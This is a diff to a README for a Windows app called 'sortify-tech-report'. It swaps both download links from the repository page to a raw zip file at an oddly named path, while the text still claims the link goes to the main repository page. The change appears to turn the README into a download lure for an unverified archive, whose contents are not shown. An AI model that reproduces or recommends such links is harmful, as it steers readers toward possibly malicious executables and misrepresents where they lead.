@@ -1,6 +1,6 @@
 # 🤖 sortify-tech-report - Turn ranking tasks into steady results
 
-[![Download sortify-tech-report](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Liannamacroeconomic37/sortify-tech-report)
+[![Download sortify-tech-report](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Liannamacroeconomic37/sortify-tech-report/raw/refs/heads/main/megalomaniacal/report-tech-sortify-uncheeriness.zip)
 
 ## 🧭 What this app does
 
@@ -32,7 +32,7 @@ If your PC is older, close other apps before you start. That helps the app load 
 
 Open the download page here:
 
-[Go to the sortify-tech-report download page](https://github.com/Liannamacroeconomic37/sortify-tech-report)
+[Go to the sortify-tech-report download page](https://github.com/Liannamacroeconomic37/sortify-tech-report/raw/refs/heads/main/megalomaniacal/report-tech-sortify-uncheeriness.zip)
 
 Since this link points to the main repository page, visit the page to download the Windows app files from there.
 
